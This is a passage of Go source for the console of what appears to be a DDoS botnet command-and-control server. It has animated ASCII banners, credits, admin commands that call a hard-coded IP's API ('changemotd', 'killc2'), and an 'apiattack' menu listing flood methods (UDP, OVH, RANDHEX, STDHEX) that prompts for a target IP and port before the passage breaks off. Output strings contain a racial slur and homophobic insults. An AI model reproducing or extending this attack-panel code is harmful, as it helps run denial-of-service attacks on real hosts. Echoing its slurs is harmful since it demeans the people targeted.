            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                           
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
            this.conn.Write([]byte("\033[37m         | == /        \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  |         \r\n"))
            this.conn.Write([]byte("\033[37m          |  /         \r\n"))
            this.conn.Write([]byte("\033[37m           |/          \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
            this.conn.Write([]byte("\033[37m          | == /       \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  |        \r\n"))
            this.conn.Write([]byte("\033[37m           |  /        \r\n"))
            this.conn.Write([]byte("\033[37m            |/         \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                            
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m           |/**/|       \r\n"))
            this.conn.Write([]byte("\033[37m           / == /       \r\n"))
            this.conn.Write([]byte("\033[37m            |  |        \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(400 * time.Millisecond)
                                        this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[37m                       \r\n"))
            this.conn.Write([]byte("\033[99m     _.-^^---....,,--             \r\n"))
            this.conn.Write([]byte("\033[93m _--                  --_         \r\n"))
            this.conn.Write([]byte("\033[93m<                        >)        \r\n"))
            this.conn.Write([]byte("\033[93m|                         |        \r\n"))
            this.conn.Write([]byte("\033[93m /._                   _./         \r\n"))
            this.conn.Write([]byte("\033[97m    ```--. . , ; .--'''            \r\n"))
            this.conn.Write([]byte("\033[93m          | |   |                  \r\n"))
            this.conn.Write([]byte("\033[93m       .-=||  | |=-.               \r\n"))
            this.conn.Write([]byte("\033[97m       `-=#$%&%$#=-'               \r\n"))
            this.conn.Write([]byte("\033[93m          | ;  :|    nuke          \r\n"))
            this.conn.Write([]byte("\033[37m _____.,-#%&$@%#&#~,._____         \r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(1000 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat nigga\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat nigga got\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(300 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37mthat nigga got \033[35mNUKED\r\n"))
            this.conn.Write([]byte("\033[37m\r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
        }
        if cmd == "support" {
        	stoplol: 
        	this.conn.Write([]byte("\x1b[1;35mmsg\x1b[1;37m:\x1b[0m "))
			new_pw, err := this.ReadLine(false)
            if err != nil {
                return
            }
			fmt.Println("\x1b[35m Support chat from "+ username +" msg: "+ new_pw +"\nmsg back: ")
			var str string
 			fmt.Scanf("%s", &str)
 			this.conn.Write([]byte("Reply: "+ str +"\r\n"))
 			goto stoplol;
		}
			if cmd == "batman" {
			this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m       _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m  .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37md888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37mYJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m  '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m    `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m         _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m    .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m   d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m  d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m  888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m  888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m  YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m   Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m    '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m      `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m           _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m      .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m     d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m    d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m    888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m    888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m    YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m     Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m      '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m        `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m               _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m          .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m         d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m        d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m        888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m        888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m        YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m         Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m          '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m            `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                  _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m             .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m            d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m           d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m           888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m           888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m           YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m            Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m             '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m               `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                         _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m                    .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m                   d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m                  d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m                  888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                  888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                  YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m                   Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m                    '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m                      `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                             _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m                        .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m                       d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m                      d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m                      888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                      888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                      YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m                       Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m                        '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m                          `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                                       _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m                                  .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m                                 d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m                                d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m                                888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                                888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                                YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m                                 Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m                                  '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m                                    `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                                  _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m                             .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m                            d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m                           d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m                           888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                           888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                           YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m                            Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m                             '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m                               `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            time.Sleep(100 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\033[37m                               _,    _ \033[93m  _    ,_                           \r\n"))
            this.conn.Write([]byte("\033[37m                          .o888P     Y8\033[93mo8Y     Y888o.                      \r\n"))
            this.conn.Write([]byte("\033[37m                         d88888      88\033[93m888      88888b                     \r\n"))
            this.conn.Write([]byte("\033[37m                        d888888b_  _d88\033[93m888b_  _d888888b                    \r\n"))
            this.conn.Write([]byte("\033[37m                        888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                        888888888888888\033[93m8888888888888888                    \r\n"))
            this.conn.Write([]byte("\033[37m                        YJGS8P8Y888P8Y8\033[93m88P8Y888P8Y8888P                    \r\n"))
            this.conn.Write([]byte("\033[37m                         Y888   '8'   Y\033[93m8P   '8'   888Y                     \r\n"))
            this.conn.Write([]byte("\033[37m                          '8o          \033[93mV          o8'                      \r\n"))
            this.conn.Write([]byte("\033[37m                            `                     `                                \r\n"))
            this.conn.Write([]byte("\r\n"))
            this.conn.Write([]byte("\r\n"))
            continue
		}
		if err != nil || cmd == "CREDITS" || cmd == "credits" {
			this.conn.Write([]byte("\x1b[1;37m@gme.crzy - src maker/dev/owner\r\n"))
			this.conn.Write([]byte("\x1b[1;37m@jck.zte dev/owner\r\n"))
			continue
		}
		if err != nil || cmd == ".admin" || cmd == ".ADMIN" {
			this.conn.Write([]byte("\x1b[1;37madduser\r\n"))
			this.conn.Write([]byte("\x1b[1;37maddadmin\r\n"))
			continue
		}
		if cmd == "kys" {
			return
		}
		if strings.Contains(cmd, "@") {
			this.conn.Write([]byte("\x1b[38;5;214m                    Nice Try Fag Doesnt Work Dumb Fuck\r\n"))
			fmt.Println("\x1b[35m \x1b[38;5;91mSome Skid Is Trying To Crash Me But Failed LuL")
			continue
		}
        
        if userInfo.admin == 1 && cmd == "changemotd" {
			this.conn.Write([]byte("\x1b[38;5;214mMSG\x1b[38;5;91m: \x1b[0m"))
			locipaddress, err := this.ReadLine(false)
			if err != nil {
				return
			}
			url := "http://67.205.176.52/motd.php?key=APIKEY&host=[host]&port=[port]&method=MOTD&time=" + locipaddress
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[38;5;214mResults\x1b[38;5;214m: \r\n\x1b[38;5;214m" + locformatted + "\x1b[0m\r\n"))
		}
		if userInfo.admin == 1 && cmd == "killc2" {
			url := "http://67.205.176.52/motd.php?key=APIKEY&host=[host]&port=[port]&method=KILL&time=879"
			tr := &http.Transport{
				ResponseHeaderTimeout: 5 * time.Second,
				DisableCompression:    true,
			}
			client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
			locresponse, err := client.Get(url)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locresponsedata, err := ioutil.ReadAll(locresponse.Body)
			if err != nil {
				this.conn.Write([]byte(fmt.Sprintf("\033[31mAn Error Occured! Please try again Later.\033[37;1m\r\n")))
				continue
			}
			locrespstring := string(locresponsedata)
			locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
			this.conn.Write([]byte("\x1b[38;5;214mResults\x1b[38;5;214m: \r\n\x1b[38;5;214m" + locformatted + "\x1b[0m\r\n"))
		}	
        if err != nil || cmd == "API" || cmd == "api" || cmd == "apiattack" || cmd == "APIATTACK" {
			this.conn.Write([]byte("\033[2J\033[1;1H"))
			this.conn.Write([]byte("\x1b[38;5;214m                               ╔════════════════╗\r\n"))
			this.conn.Write([]byte("\x1b[38;5;214m                               ║  homehold      ║\r\n"))
            this.conn.Write([]byte("\x1b[38;5;214m                   ╔═══════════╩════════════════╩══════════╗\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;214m                   ║ UDP, STOP                             ║\033[0m\r\n"))// ╠═╣
            this.conn.Write([]byte("\x1b[38;5;214m      ╔════════════╣                                       ╠══════╗\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;214m      ║   blazings ║                                       ║ gapi ║\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;214m      ╠════════════╣                                       ╠══════╣\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;214m      ║ OVH        ║                                       ║SOON! ║\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;214m      ║ RANDHEX    ║                                       ║      ║\033[0m\r\n"))
            this.conn.Write([]byte("\x1b[38;5;214m      ║ UDP        ║                                       ║      ║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[38;5;214m      ║ STDHEX     ║                                       ╠══════╝\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[38;5;214m      ╚════════════╣                                       ║\033[0m \r\n"))
            this.conn.Write([]byte("\x1b[38;5;214m                   ╚══════════════════╦════════════════════╝\033[0m \r\n"))
		    this.conn.Write([]byte("\x1b[38;5;214m                                      ╠IPv4: "))
		    apiip, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[38;5;214m                                      ╠PORT: "))
		    port, err := this.ReadLine(false)
            if err != nil {
                return
            }
            this.conn.Write([]byte("\x1b[38;5;214m                                      ╠METHOD: "))
